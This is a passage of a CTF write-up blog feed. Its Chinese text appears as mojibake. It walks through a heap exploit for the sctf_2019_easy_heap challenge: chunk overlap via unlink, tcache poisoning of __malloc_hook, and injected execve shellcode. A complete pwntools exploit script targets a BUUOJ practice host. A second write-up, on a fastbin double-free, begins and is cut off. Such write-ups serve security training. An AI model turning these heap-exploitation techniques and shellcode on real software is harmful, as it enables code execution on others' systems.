†ï¼Œå¹¶æ¥æ”¶å…¶åœ°å€,è¿™ä¸ªåœ°å€å­˜äº†mallocçš„å †çš„åœ°å€</h5><pre><code class="lang-py">add(0x410)p.recvuntil(&#39;Address &#39;)chunk0_addr=int(p.recv(14),16)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p><h5 id="ç„¶åå†åˆ›å»ºå››ä¸ªå¤§å°ä¸åŒçš„å †"><a href="#ç„¶åå†åˆ›å»ºå››ä¸ªå¤§å°ä¸åŒçš„å †" class="headerlink" title="ç„¶åå†åˆ›å»ºå››ä¸ªå¤§å°ä¸åŒçš„å †"></a>ç„¶åå†åˆ›å»ºå››ä¸ªå¤§å°ä¸åŒçš„å †</h5><pre><code class="lang-py">add(0x28)add(0x18)add(0x4f8)add(0x10)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p><h5 id="ç„¶åfreeæ‰å †0"><a href="#ç„¶åfreeæ‰å †0" class="headerlink" title="ç„¶åfreeæ‰å †0"></a>ç„¶åfreeæ‰å †0</h5><pre><code class="lang-py">dele(0)</code></pre><h5 id="ç„¶åeditå †2-ä¹Ÿå°±æ˜¯è¾“å…¥å†…å®¹ï¼Œæ„é€ ä¸‹é¢çš„unlink"><a href="#ç„¶åeditå †2-ä¹Ÿå°±æ˜¯è¾“å…¥å†…å®¹ï¼Œæ„é€ ä¸‹é¢çš„unlink" class="headerlink" title="ç„¶åeditå †2,ä¹Ÿå°±æ˜¯è¾“å…¥å†…å®¹ï¼Œæ„é€ ä¸‹é¢çš„unlink"></a>ç„¶åeditå †2,ä¹Ÿå°±æ˜¯è¾“å…¥å†…å®¹ï¼Œæ„é€ ä¸‹é¢çš„unlink</h5><pre><code class="lang-py">payload=p64(0)*2+p64(0x420+0x20+0x30)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p><h5 id="åœ¨freeå †3åï¼Œå°±ä¼šunlinkåˆå¹¶ï¼Œå››ä¸ªå †åˆå¹¶åœ¨ä¸€èµ·"><a href="#åœ¨freeå †3åï¼Œå°±ä¼šunlinkåˆå¹¶ï¼Œå››ä¸ªå †åˆå¹¶åœ¨ä¸€èµ·" class="headerlink" title="åœ¨freeå †3åï¼Œå°±ä¼šunlinkåˆå¹¶ï¼Œå››ä¸ªå †åˆå¹¶åœ¨ä¸€èµ·"></a>åœ¨freeå †3åï¼Œå°±ä¼šunlinkåˆå¹¶ï¼Œå››ä¸ªå †åˆå¹¶åœ¨ä¸€èµ·</h5><pre><code class="lang-py">dele(3) freeå †3</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p><h5 id="è¿™é‡Œå­˜å †0ï¼Œå †3çš„æŒ‡é’ˆéƒ½è¢«æ¸…æ‰äº†ã€‚"><a href="#è¿™é‡Œå­˜å †0ï¼Œå †3çš„æŒ‡é’ˆéƒ½è¢«æ¸…æ‰äº†ã€‚" class="headerlink" title="è¿™é‡Œå­˜å †0ï¼Œå †3çš„æŒ‡é’ˆéƒ½è¢«æ¸…æ‰äº†ã€‚"></a>è¿™é‡Œå­˜å †0ï¼Œå †3çš„æŒ‡é’ˆéƒ½è¢«æ¸…æ‰äº†ã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p><h5 id="å†freeå †1ï¼Œå †2"><a href="#å†freeå †1ï¼Œå †2" class="headerlink" title="å†freeå †1ï¼Œå †2"></a>å†freeå †1ï¼Œå †2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p><p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p><h5 id="ç„¶ååˆmallocä¸¤æ¬¡-ä¸¤ä¸ªå¤§å°åŠ èµ·æ¥åˆšå¥½æ˜¯0x970-ä¼šä»åŸæ¥çš„freechunkä¸­æ‹¿ã€‚"><a href="#ç„¶ååˆmallocä¸¤æ¬¡-ä¸¤ä¸ªå¤§å°åŠ èµ·æ¥åˆšå¥½æ˜¯0x970-ä¼šä»åŸæ¥çš„freechunkä¸­æ‹¿ã€‚" class="headerlink" title="ç„¶ååˆmallocä¸¤æ¬¡,ä¸¤ä¸ªå¤§å°åŠ èµ·æ¥åˆšå¥½æ˜¯0x970,ä¼šä»åŸæ¥çš„freechunkä¸­æ‹¿ã€‚"></a>ç„¶ååˆmallocä¸¤æ¬¡,ä¸¤ä¸ªå¤§å°åŠ èµ·æ¥åˆšå¥½æ˜¯0x970,ä¼šä»åŸæ¥çš„freechunkä¸­æ‹¿ã€‚</h5><pre><code class="lang-py">add(0x440)add(0x510)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p><p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p><p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p><h5 id="ç„¶åç¼–è¾‘è¿™ä¸¤ä¸ªå †çš„å†…å®¹"><a href="#ç„¶åç¼–è¾‘è¿™ä¸¤ä¸ªå †çš„å†…å®¹" class="headerlink" title="ç„¶åç¼–è¾‘è¿™ä¸¤ä¸ªå †çš„å†…å®¹"></a>ç„¶åç¼–è¾‘è¿™ä¸¤ä¸ªå †çš„å†…å®¹</h5><pre><code class="lang-py">payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)fill(0,payload)fill(1,&#39;\x30&#39;)</code></pre><h5 id="ç¼–è¾‘å®Œåï¼Œè¿™æ˜¯å †0çš„"><a href="#ç¼–è¾‘å®Œåï¼Œè¿™æ˜¯å †0çš„" class="headerlink" title="ç¼–è¾‘å®Œåï¼Œè¿™æ˜¯å †0çš„"></a>ç¼–è¾‘å®Œåï¼Œè¿™æ˜¯å †0çš„</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p><h5 id="æˆåŠŸä¿®æ”¹äº†0x30çš„tachebinæŒ‡é’ˆæˆmmap-10çš„åœ°å€ï¼Œ0x5577338a86b0è¿™æ˜¯æœ€åä¸€ä¸ªå †çš„åœ°å€ï¼Œtachebinæœºåˆ¶åœ¨freechunké‡Œçš„æœ€åä¸€ä¸ªå †æŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ã€‚"><a href="#æˆåŠŸä¿®æ”¹äº†0x30çš„tachebinæŒ‡é’ˆæˆmmap-10çš„åœ°å€ï¼Œ0x5577338a86b0è¿™æ˜¯æœ€åä¸€ä¸ªå †çš„åœ°å€ï¼Œtachebinæœºåˆ¶åœ¨freechunké‡Œçš„æœ€åä¸€ä¸ªå †æŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ã€‚" class="headerlink" title="æˆåŠŸä¿®æ”¹äº†0x30çš„tachebinæŒ‡é’ˆæˆmmap+10çš„åœ°å€ï¼Œ0x5577338a86b0è¿™æ˜¯æœ€åä¸€ä¸ªå †çš„åœ°å€ï¼Œtachebinæœºåˆ¶åœ¨freechunké‡Œçš„æœ€åä¸€ä¸ªå †æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ã€‚"></a>æˆåŠŸä¿®æ”¹äº†0x30çš„tachebinæŒ‡é’ˆæˆmmap+10çš„åœ°å€ï¼Œ0x5577338a86b0è¿™æ˜¯æœ€åä¸€ä¸ªå †çš„åœ°å€ï¼Œtachebinæœºåˆ¶åœ¨freechunké‡Œçš„æœ€åä¸€ä¸ªå †æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p><h5 id="è¿™æ˜¯å †1çš„ï¼ŒbinæŒ‡é’ˆä¿®æ”¹æˆäº†malloc-hookçš„åœ°å€ã€‚"><a href="#è¿™æ˜¯å †1çš„ï¼ŒbinæŒ‡é’ˆä¿®æ”¹æˆäº†malloc-hookçš„åœ°å€ã€‚" class="headerlink" title="è¿™æ˜¯å †1çš„ï¼ŒbinæŒ‡é’ˆä¿®æ”¹æˆäº†malloc_hookçš„åœ°å€ã€‚"></a>è¿™æ˜¯å †1çš„ï¼ŒbinæŒ‡é’ˆä¿®æ”¹æˆäº†malloc_hookçš„åœ°å€ã€‚</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p><h5 id="åŸæœ¬çš„è¯æŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ï¼Œæ”¹æ‰æœ€åçš„å­—èŠ‚æˆ0x30å°±æ˜¯malloc-hookçš„åœ°å€"><a href="#åŸæœ¬çš„è¯æŒ‡å‘main-arena-96è¿™ä¸ªåœ°å€ï¼Œæ”¹æ‰æœ€åçš„å­—èŠ‚æˆ0x30å°±æ˜¯malloc-hookçš„åœ°å€" class="headerlink" title="åŸæœ¬çš„è¯æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œæ”¹æ‰æœ€åçš„å­—èŠ‚æˆ0x30å°±æ˜¯malloc_hookçš„åœ°å€"></a>åŸæœ¬çš„è¯æŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œæ”¹æ‰æœ€åçš„å­—èŠ‚æˆ0x30å°±æ˜¯malloc_hookçš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p><h5 id="å†mallocä¸¤æ¬¡ï¼ŒæŠŠå¤šä½™çš„freechunkæ‹¿æ‰"><a href="#å†mallocä¸¤æ¬¡ï¼ŒæŠŠå¤šä½™çš„freechunkæ‹¿æ‰" class="headerlink" title="å†mallocä¸¤æ¬¡ï¼ŒæŠŠå¤šä½™çš„freechunkæ‹¿æ‰"></a>å†mallocä¸¤æ¬¡ï¼ŒæŠŠå¤šä½™çš„freechunkæ‹¿æ‰</h5><pre><code class="lang-py">add(0x28)#2add(0x18)#3</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p><h5 id="å†addå †5ï¼Œä¹Ÿå°±æ˜¯åœ¨maap-10è¿™ä¸ªåœ°å€ä¸Šæ”¾shellcodeï¼Œæ‰‹å†™shellcodeæ˜¯çœŸçš„å¼ºå¥½å§"><a href="#å†addå †5ï¼Œä¹Ÿå°±æ˜¯åœ¨maap-10è¿™ä¸ªåœ°å€ä¸Šæ”¾shellcodeï¼Œæ‰‹å†™shellcodeæ˜¯çœŸçš„å¼ºå¥½å§" class="headerlink" title="å†addå †5ï¼Œä¹Ÿå°±æ˜¯åœ¨maap+10è¿™ä¸ªåœ°å€ä¸Šæ”¾shellcodeï¼Œæ‰‹å†™shellcodeæ˜¯çœŸçš„å¼ºå¥½å§"></a>å†addå †5ï¼Œä¹Ÿå°±æ˜¯åœ¨maap+10è¿™ä¸ªåœ°å€ä¸Šæ”¾shellcodeï¼Œæ‰‹å†™shellcodeæ˜¯çœŸçš„å¼ºå¥½å§</h5><pre><code class="lang-py">add(0x28)#5payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;fill(5,payload2 + &#39;\n&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p><h5 id="å†addå †6ï¼Œå¤§å°åœ¨0x10åˆ°0x18ä¹‹é—´æ‰èƒ½åœ¨0x20çš„tachebin-malloc-hook-é‡Œç”³è¯·ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾ä¸Šst-addr-0x10çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯maap-addr-0x10çš„åœ°å€ã€‚"><a href="#å†addå †6ï¼Œå¤§å°åœ¨0x10åˆ°0x18ä¹‹é—´æ‰èƒ½åœ¨0x20çš„tachebin-malloc-hook-é‡Œç”³è¯·ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾ä¸Šst-addr-0x10çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯maap-addr-0x10çš„åœ°å€ã€‚" class="headerlink" title="å†addå †6ï¼Œå¤§å°åœ¨0x10åˆ°0x18ä¹‹é—´æ‰èƒ½åœ¨0x20çš„tachebin(malloc_hook)é‡Œç”³è¯·ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾ä¸Šst_addr+0x10çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯maap_addr+0x10çš„åœ°å€ã€‚"></a>å†addå †6ï¼Œå¤§å°åœ¨0x10åˆ°0x18ä¹‹é—´æ‰èƒ½åœ¨0x20çš„tachebin(malloc_hook)é‡Œç”³è¯·ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¾ä¸Šst_addr+0x10çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯maap_addr+0x10çš„åœ°å€ã€‚</h5><pre><code class="lang-py">add(0x18)#6edit(6,p64(st_addr + 0x10) + &#39;\n&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p><h5 id="è¿™æ˜¯å †5å’Œå †6çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯mmap-10çš„åœ°å€å’Œmalloc-hookçš„åœ°å€"><a href="#è¿™æ˜¯å †5å’Œå †6çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯mmap-10çš„åœ°å€å’Œmalloc-hookçš„åœ°å€" class="headerlink" title="è¿™æ˜¯å †5å’Œå †6çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯mmap+10çš„åœ°å€å’Œmalloc_hookçš„åœ°å€"></a>è¿™æ˜¯å †5å’Œå †6çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯mmap+10çš„åœ°å€å’Œmalloc_hookçš„åœ°å€</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p><h5 id="æœ€åï¼Œå†mallocä¸€æ¬¡ï¼Œå°±ä¼šæ‰§è¡Œmalloc-hook-è€Œè¿™ä¸ªåœ°å€å°±ä¼šå»æ‰§è¡Œmmap-0x10è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ”¾åˆshellcodeï¼ŒæˆåŠŸææƒã€‚"><a href="#æœ€åï¼Œå†mallocä¸€æ¬¡ï¼Œå°±ä¼šæ‰§è¡Œmalloc-hook-è€Œè¿™ä¸ªåœ°å€å°±ä¼šå»æ‰§è¡Œmmap-0x10è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ”¾åˆshellcodeï¼ŒæˆåŠŸææƒã€‚" class="headerlink" title="æœ€åï¼Œå†mallocä¸€æ¬¡ï¼Œå°±ä¼šæ‰§è¡Œmalloc_hook,è€Œè¿™ä¸ªåœ°å€å°±ä¼šå»æ‰§è¡Œmmap+0x10è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ”¾åˆshellcodeï¼ŒæˆåŠŸææƒã€‚"></a>æœ€åï¼Œå†mallocä¸€æ¬¡ï¼Œå°±ä¼šæ‰§è¡Œmalloc_hook,è€Œè¿™ä¸ªåœ°å€å°±ä¼šå»æ‰§è¡Œmmap+0x10è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ”¾åˆshellcodeï¼ŒæˆåŠŸææƒã€‚</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29573)#p=process(&quot;./sctf_2019_easy_heap&quot;)context(arch=&#39;amd64&#39;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)def add(size):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(index,content):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Content: &#39;,content)def dele(index):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))p.recvuntil(&#39;Mmap: &#39;)mmap_addr=int(p.recv(12),16)print(hex(mmap_addr))add(0x410) add(0x28)add(0x18)add(0x4f8)add(0x10)dele(0)payload=p64(0)*2+p64(0x420+0x20+0x30)fill(2,payload)dele(3)dele(1)dele(2)add(0x440)add(0x510)payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)fill(0,payload)fill(1,&#39;\x30&#39;)add(0x28)#2add(0x18)#3add(0x28)#5add(0x18)#6payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;fill(5,payload2)fill(6,p64(mmap_addr + 0x10))add(0x10)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/16/gyctf_2020_some_thing_exceting/"/>
      <url>/2023/10/16/gyctf_2020_some_thing_exceting/</url>
      
        <content type="html"><![CDATA[<h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="æœ‰ç‚¹å¥‡æ€ªçš„UAFé¢˜ï¼Œdouble-free-æœ‰ç‚¹å¥‡æ€ª"><a href="#æœ‰ç‚¹å¥‡æ€ªçš„UAFé¢˜ï¼Œdouble-free-æœ‰ç‚¹å¥‡æ€ª" class="headerlink" title="æœ‰ç‚¹å¥‡æ€ªçš„UAFé¢˜ï¼Œdouble free æœ‰ç‚¹å¥‡æ€ª"></a>æœ‰ç‚¹å¥‡æ€ªçš„UAFé¢˜ï¼Œdouble free æœ‰ç‚¹å¥‡æ€ª</h4><h4 id="åšè¿™é“é¢˜å‰å…ˆåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä¸ç„¶çš„è¯ç¨‹åºè¿è¡Œä¸èµ·æ¥"><a href="#åšè¿™é“é¢˜å‰å…ˆåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä¸ç„¶çš„è¯ç¨‹åºè¿è¡Œä¸èµ·æ¥" class="headerlink" title="åšè¿™é“é¢˜å‰å…ˆåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä¸ç„¶çš„è¯ç¨‹åºè¿è¡Œä¸èµ·æ¥"></a>åšè¿™é“é¢˜å‰å…ˆåœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªflagæ–‡ä»¶ï¼Œä¸ç„¶çš„è¯ç¨‹åºè¿è¡Œä¸èµ·æ¥</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p><h4 id="flagæ˜¯åœ¨bssæ®µä¸Šçš„ï¼ŒåŒå‡»fgetsé‡Œçš„sï¼Œå¯ä»¥çœ‹åˆ°flagæ˜¯æ”¾åœ¨0x6020a8"><a href="#flagæ˜¯åœ¨bssæ®µä¸Šçš„ï¼ŒåŒå‡»fgetsé‡Œçš„sï¼Œå¯ä»¥çœ‹åˆ°flagæ˜¯æ”¾åœ¨0x6020a8" class="headerlink" title="flagæ˜¯åœ¨bssæ®µä¸Šçš„ï¼ŒåŒå‡»fgetsé‡Œçš„sï¼Œå¯ä»¥çœ‹åˆ°flagæ˜¯æ”¾åœ¨0x6020a8"></a>flagæ˜¯åœ¨bssæ®µä¸Šçš„ï¼ŒåŒå‡»fgetsé‡Œçš„sï¼Œå¯ä»¥çœ‹åˆ°flagæ˜¯æ”¾åœ¨0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p><h4 id="é™¤äº†æ²¡æœ‰editå‡½æ•°ï¼Œå…¶ä»–éƒ½æœ‰"><a href="#é™¤äº†æ²¡æœ‰editå‡½æ•°ï¼Œå…¶ä»–éƒ½æœ‰" class="headerlink" title="é™¤äº†æ²¡æœ‰editå‡½æ•°ï¼Œå…¶ä»–éƒ½æœ‰"></a>é™¤äº†æ²¡æœ‰editå‡½æ•°ï¼Œå…¶ä»–éƒ½æœ‰</h4><h4 id="addå‡½æ•°ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œç„¶åä¼šå†åˆ›å»ºä¸¤ä¸ªå †ï¼Œ0x10çš„å †ä¸Šæ”¾ä¸¤å¤–çš„ä¸¤ä¸ªå †çš„åœ°å€ï¼Œç„¶åæ˜¯è¾“å…¥å†…å®¹ã€‚"><a href="#addå‡½æ•°ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œç„¶åä¼šå†åˆ›å»ºä¸¤ä¸ªå †ï¼Œ0x10çš„å †ä¸Šæ”¾ä¸¤å¤–çš„ä¸¤ä¸ªå †çš„åœ°å€ï¼Œç„¶åæ˜¯è¾“å…¥å†…å®¹ã€‚" class="headerlink" title="addå‡½æ•°ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œç„¶åä¼šå†åˆ›å»ºä¸¤ä¸ªå †ï¼Œ0x10çš„å †ä¸Šæ”¾ä¸¤å¤–çš„ä¸¤ä¸ªå †çš„åœ°å€ï¼Œç„¶åæ˜¯è¾“å…¥å†…å®¹ã€‚"></a>addå‡½æ•°ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª0x10å¤§å°çš„å †ï¼Œç„¶åä¼šå†åˆ›å»ºä¸¤ä¸ªå †ï¼Œ0x10çš„å †ä¸Šæ”¾ä¸¤å¤–çš„ä¸¤ä¸ªå †çš„åœ°å€ï¼Œç„¶åæ˜¯è¾“å…¥å†…å®¹ã€‚</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p><h4 id="showå‡½æ•°ï¼Œå°†ä¸¤ä¸ªåœ°å€çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼ŒåæœŸæ˜¯ç”¨æ¥æ‰“å°flag"><a href="#showå‡½æ•°ï¼Œå°†ä¸¤ä¸ªåœ°å€çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼ŒåæœŸæ˜¯ç”¨æ¥æ‰“å°flag" class="headerlink" title="showå‡½æ•°ï¼Œå°†ä¸¤ä¸ªåœ°å€çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼ŒåæœŸæ˜¯ç”¨æ¥æ‰“å°flag"></a>showå‡½æ•°ï¼Œå°†ä¸¤ä¸ªåœ°å€çš„å†…å®¹éƒ½æ‰“å°å‡ºæ¥ï¼ŒåæœŸæ˜¯ç”¨æ¥æ‰“å°flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p><h4 id="deleå‡½æ•°ï¼Œæ²¡æœ‰æŠŠbssä¸Šçš„å †æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥double-free"><a href="#deleå‡½æ•°ï¼Œæ²¡æœ‰æŠŠbssä¸Šçš„å †æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥double-free" class="headerlink" title="deleå‡½æ•°ï¼Œæ²¡æœ‰æŠŠbssä¸Šçš„å †æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥double free"></a>deleå‡½æ•°ï¼Œæ²¡æœ‰æŠŠbssä¸Šçš„å †æŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå¯ä»¥double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p><h4 id="æ¼æ´æ˜¯åˆ©ç”¨double-free-å…ˆå•ç‹¬freeåŒä¸€ä¸ªä¸¤æ¬¡å †ä¸è¡Œï¼Œå¾—å…ˆåˆ›å»ºä¸¤æ¬¡"><a href="#æ¼æ´æ˜¯åˆ©ç”¨double-free-å…ˆå•ç‹¬freeåŒä¸€ä¸ªä¸¤æ¬¡å †ä¸è¡Œï¼Œå¾—å…ˆåˆ›å»ºä¸¤æ¬¡" class="headerlink" title="æ¼æ´æ˜¯åˆ©ç”¨double free ,å…ˆå•ç‹¬freeåŒä¸€ä¸ªä¸¤æ¬¡å †ä¸è¡Œï¼Œå¾—å…ˆåˆ›å»ºä¸¤æ¬¡"></a>æ¼æ´æ˜¯åˆ©ç”¨double free ,å…ˆå•ç‹¬freeåŒä¸€ä¸ªä¸¤æ¬¡å †ä¸è¡Œï¼Œå¾—å…ˆåˆ›å»ºä¸¤æ¬¡</h4><pre><code class="lang-py">bss=0x6020a8-0x10add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;)dele(0)</code></pre><p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p><pre><code class="lang-py">dele(1)</code></pre><h4 id="è¿™æ˜¯freeæ‰ç¬¬äºŒä¸ªå †æ—¶å€™çš„æ ·å­ä»¥åŠå…¶binçš„æ ·å­ï¼Œfreeå‡½æ•°çš„åœ°å€å¯ä»¥æ˜¯é›¶"><a href="#è¿™æ˜¯freeæ‰ç¬¬äºŒä¸ªå †æ—¶å€™çš„æ ·å­ä»¥åŠå…¶binçš„æ ·å­ï¼Œfreeå‡½æ•°çš„åœ°å€å¯ä»¥æ˜¯é›¶" class="headerlink" title="è¿™æ˜¯freeæ‰ç¬¬äºŒä¸ªå †æ—¶å€™çš„æ ·å­ä»¥åŠå…¶binçš„æ ·å­ï¼Œfreeå‡½æ•°çš„åœ°å€å¯ä»¥æ˜¯é›¶"></a>è¿™æ˜¯freeæ‰ç¬¬äºŒä¸ªå †æ—¶å€™çš„æ ·å­ä»¥åŠå…¶binçš„æ ·å­ï¼Œfreeå‡½æ•°çš„åœ°å€å¯ä»¥æ˜¯é›¶</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p><pre><code class="lang-py">dele(0) #double free</code></pre><h4 id="è¿™é‡Œçš„è¯æ˜¯double-free-ï¼Œå½¢æˆä¸¤ä¸ªå¾ªç¯é“¾è¡¨ï¼Œ0x20å¤§å°çš„fastbinä¸­0x1855240æŒ‡å‘0x1852300ï¼Œ0x1852300æŒ‡å‘0x1852240ã€‚0x50å¤§å°çš„fastbinä¸­0x18522b0æŒ‡å‘0x1852370ç­‰ç­‰"><a href="#è¿™é‡Œçš„è¯æ˜¯double-free-ï¼Œå½¢æˆä¸¤ä¸ªå¾ªç¯é“¾è¡¨ï¼Œ0x20å¤§å°çš„fastbinä¸­0x1855240æŒ‡å‘0x1852300ï¼Œ0x1852300æŒ‡å‘0x1852240ã€‚0x50å¤§å°çš„fastbinä¸­0x18522b0æŒ‡å‘0x1852370ç­‰ç­‰" class="headerlink" title="è¿™é‡Œçš„è¯æ˜¯double free ï¼Œå½¢æˆä¸¤ä¸ªå¾ªç¯é“¾è¡¨ï¼Œ0x20å¤§å°çš„fastbinä¸­0x1855240æŒ‡å‘0x1852300ï¼Œ0x1852300æŒ‡å‘0x1852240ã€‚0x50å¤§å°çš„fastbinä¸­0x18522b0æŒ‡å‘0x1852370ç­‰ç­‰"></a>è¿™é‡Œçš„è¯æ˜¯double free ï¼Œå½¢æˆä¸¤ä¸ªå¾ªç¯é“¾è¡¨ï¼Œ0x20å¤§å°çš„fastbinä¸­0x1855240æŒ‡å‘0x1852300ï¼Œ0x1852300æŒ‡å‘0x1852240ã€‚0x50å¤§å°çš„fastbinä¸­0x18522b0æŒ‡å‘0x1852370ç­‰ç­‰</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p><pre><code>add(0x40,p64(bss),0x40,&#39;AAAA&#39;)</code></pre><h4 id="å†addä¸€ä¸‹çš„è¯ï¼Œä¼šå…ˆåœ¨biné‡Œå–ï¼Œè¿™é‡Œçš„è¯æŠŠå…ˆåœ¨0x18522b0å’Œ0x2952370å†™ä¸Šå†…å®¹ï¼Œç„¶åå°±æŠŠbiné“¾ç»™æ”¹æ‰äº†0x50çš„fastbinè¿™é‡ŒæŒ‡å‘äº†æœ€åçš„flagåœ°å€"><a href="#å†addä¸€ä¸‹çš„è¯ï¼Œä¼šå…ˆåœ¨biné‡Œå–ï¼Œè¿™é‡Œçš„è¯æŠŠå…ˆåœ¨0x18522b0å’Œ0x2952370å†™ä¸Šå†…å®¹ï¼Œç„¶åå°±æŠŠbiné“¾ç»™æ”¹æ‰äº†0x50çš„fastbinè¿™é‡ŒæŒ‡å‘äº†æœ€åçš„flagåœ°å€" class="headerlink" 